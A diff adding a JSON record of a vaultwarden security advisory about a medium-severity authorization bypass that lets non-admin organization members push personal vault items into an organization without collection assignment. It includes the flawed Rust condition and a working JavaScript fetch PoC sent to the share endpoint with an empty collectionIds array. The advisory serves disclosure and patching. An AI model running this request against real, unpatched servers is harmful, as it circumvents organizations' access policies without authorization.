@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-7ccc-c43j-4p36",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 4.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "### Summary\r\n\r\nAn authorization bypass vulnerability in the cipher sharing logic allows non-admin organization members to transfer personal ciphers to an organization without assigning them to a collection. This bypasses collection restrictions and results in \"orphan\" ciphers being injected directly into the organization's root.\r\n\r\n### Details\r\n\r\nIn `src/api/core/ciphers.rs`, the `update_cipher_from_data` function validates whether a user has permission to transfer a cipher to an organization. The authorization check relies on the following condition:\r\n\r\n```rust\r\nif shared_to_collections.as_ref().is_some_and(|cols| !cols.is_empty())\r\n    || member.has_full_access()\r\n    || cipher.is_write_accessible_to_user(&headers.user.uuid, conn).await\r\n\r\n```\r\n\r\nWhen a user shares a personal cipher, `is_write_accessible_to_user` evaluates to `true` because the user is the original owner. This creates a boolean short-circuit, bypassing the requirements that the user must either be an organization admin (`has_full_access`) or specify at least one valid collection (`!cols.is_empty()`).\r\n\r\nAs a result, the backend accepts the transfer payload even if `collectionIds` is empty, converting the cipher into an unassigned/orphan item within the organization.\r\n\r\n### PoC\r\n\r\n1. Log in to the Web Vault as **User A** (a standard, non-admin member of **Organization B**).\r\n2. Create a personal cipher (let's call it **Cipher A1**) and note its ID.\r\n3. Open the browser's Developer Tools (F12) Console and execute the following API request, deliberately leaving the `collectionIds` array empty:\r\n\r\n```\r\n// 1. Target Configuration & JWT\r\nconst JWT_TOKEN = \"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuY...[Truncated]\"; \r\nconst PERSONAL_CIPHER_ID = \"2004fb9e-8180-4909-91fb-c5a23feb20f3\"; \r\nconst TARGET_ORG_ID = \"2004fb9e-1b95-4fab-9604-b9324033b580\"; \r\n\r\n// 2. Audit Payload Construction\r\nconst payload = {\r\n    cipher: {\r\n        type: 1,\r\n        name: \"Audit_Test_Item\",\r\n        organizationId: TARGET_ORG_ID,\r\n        folderId: null,\r\n        login: {\r\n            username: \"audit_test_user\",\r\n            password: \"audit_test_password\"\r\n        }\r\n    },\r\n    // Boundary test: Empty array to verify if backend forces collection association\r\n    collectionIds: [] \r\n};\r\n\r\n// 3. API Execution\r\nfetch(`/api/ciphers/${PERSONAL_CIPHER_ID}/share`, {\r\n    method: 'PUT',\r\n    headers: {\r\n        'Authorization': JWT_TOKEN,\r\n        'Content-Type': 'application/json'\r\n    },\r\n    body: JSON.stringify(payload)\r\n})\r\n.then(async res => {\r\n    if (res.ok) {\r\n        console.warn(\"[Audit Flag] Request succeeded (200 OK). Potential logic flaw:\", await res.json());\r\n    } else {\r\n        console.log(`[Control Active] Request blocked (Status: ${res.status})`);\r\n    }\r\n})\r\n.catch(err => console.error(\"[Audit Error] Execution failed:\", err));\r\n\r\n```\r\n\r\n4. Observe that the API returns `200 OK`. Cipher A1 disappears from User A's personal vault.\r\n5. Log in as **User B** (Owner of Organization B) and navigate to the Organization Vault.\r\n6. The cipher appears under the \"Unassigned\" items, successfully bypassing the collection assignment requirement.\r\n\r\n### Impact\r\n\r\n**Broken Access Control.** Standard users can bypass organizational collection policies to inject unassigned data (orphan ciphers) directly into the organization vault. This leads to data clutter and forces administrators to manually clean up items that violate organization policies.",
+    "ghsa_id": "GHSA-7ccc-c43j-4p36",
+    "html_url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-7ccc-c43j-4p36",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-7ccc-c43j-4p36"
+      }
+    ],
+    "published_at": "2026-10-28T18:01:28Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Organization member can move personal items into an organization without collection access",
+    "updated_at": "2026-10-28T18:01:28Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "vaultwarden"
+        },
+        "patched_versions": "1.37.4",
+        "vulnerable_version_range": "<= 1.37.3"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "dani-garcia/vaultwarden"
+}
